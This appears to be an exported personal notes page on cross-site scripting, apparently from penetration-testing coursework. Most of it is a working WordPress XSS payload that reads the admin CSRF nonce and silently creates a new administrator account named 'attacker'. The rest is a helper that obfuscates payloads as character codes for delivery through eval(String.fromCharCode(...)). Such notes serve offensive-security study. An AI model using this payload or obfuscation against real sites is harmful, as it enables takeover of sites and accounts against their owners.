<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>XSS</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>XSS</h1><br/><p># nonce retrieve</p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">var</span> ajaxRequest = <span style="color:#ff9d00;font-weight:700">new</span> XMLHttpRequest();<br /><span style="color:#ff9d00;font-weight:700">var</span> requestURL = <span style="color:#3ad900;font-weight:400">&quot;/wp-admin/user-new.php&quot;</span>;<br /><span style="color:#ff9d00;font-weight:700">var</span> nonceRegex = <span style="color:#3ad900;font-weight:400">/ser&quot; value=&quot;([^&quot;]*?)&quot;/g</span>;<br />ajaxRequest.open(<span style="color:#3ad900;font-weight:400">&quot;GET&quot;</span>, requestURL, <span style="color:#ff0044;font-weight:400">false</span>);<br />ajaxRequest.send();<br /><span style="color:#ff9d00;font-weight:700">var</span> nonceMatch = nonceRegex.<span style="color:#ff9d00;font-weight:700">exec</span>(ajaxRequest.responseText);<br /><span style="color:#ff9d00;font-weight:700">var</span> nonce = nonceMatch[<span style="color:#ff0044;font-weight:400">1</span>];<br />-<br /><span style="color:#ff9d00;font-weight:700">var</span> params = <span style="color:#3ad900;font-weight:400">&quot;action=createuser&amp;_wpnonce_create-user=&quot;</span>+nonce+<span style="color:#3ad900;font-weight:400">&quot;&amp;user_login=attacker&amp;email=attacker@offsec.com&amp;pass1=attackerpass&amp;pass2=attackerpass&amp;role=administrator&quot;</span>;<br />ajaxRequest = <span style="color:#ff9d00;font-weight:700">new</span> XMLHttpRequest();<br />ajaxRequest.open(<span style="color:#3ad900;font-weight:400">&quot;POST&quot;</span>, requestURL, <span style="color:#ff0044;font-weight:400">true</span>);<br />ajaxRequest.setRequestHeader(<span style="color:#3ad900;font-weight:400">&quot;Content-Type&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;application/x-www-form-urlencoded&quot;</span>);<br />ajaxRequest.send(params);<br /><br /></pre></div></p><p></p><p># from oneliner to ascii string</p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">function</span> encode_to_javascript(string) {<br />            <span style="color:#ff9d00;font-weight:700">var</span> input = string<br />            <span style="color:#ff9d00;font-weight:700">var</span> output = <span style="color:#3ad900;font-weight:400">&#39;&#39;</span>;<br />            <span style="color:#ff9d00;font-weight:700">for</span>(pos = <span style="color:#ff0044;font-weight:400">0</span>; pos &lt; input<span style="color:#ff9d00;font-weight:400">.length</span>; pos++) {<br />                output += input.<span style="color:#ff9d00;font-weight:700">charCodeAt</span>(pos);<br />                <span style="color:#ff9d00;font-weight:700">if</span>(pos != (input<span style="color:#ff9d00;font-weight:400">.length</span> - <span style="color:#ff0044;font-weight:400">1</span>)) {<br />                    output += <span style="color:#3ad900;font-weight:400">&quot;,&quot;</span>;<br />                }<br />            }<br />            <span style="color:#ff9d00;font-weight:700">return</span> output;<br />        }<br />        <br /><span style="color:#ff9d00;font-weight:700">let</span> encoded = encode_to_javascript(<span style="color:#3ad900;font-weight:400">&#39;insert_minified_javascript&#39;</span>)<br />console.<span style="color:#ff9d00;font-weight:700">log</span>(encoded)</pre></div> </p><p></p><p>than use</p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">eval</span>(<span style="color:#7f0044;font-weight:400">String</span>.<span style="color:#ff9d00;font-weight:700">fromCharCode</span>(...))</pre></div></p><p></p><p># useful links</p><p></p><p>jscompress.com</p></div>
</body>
</html>
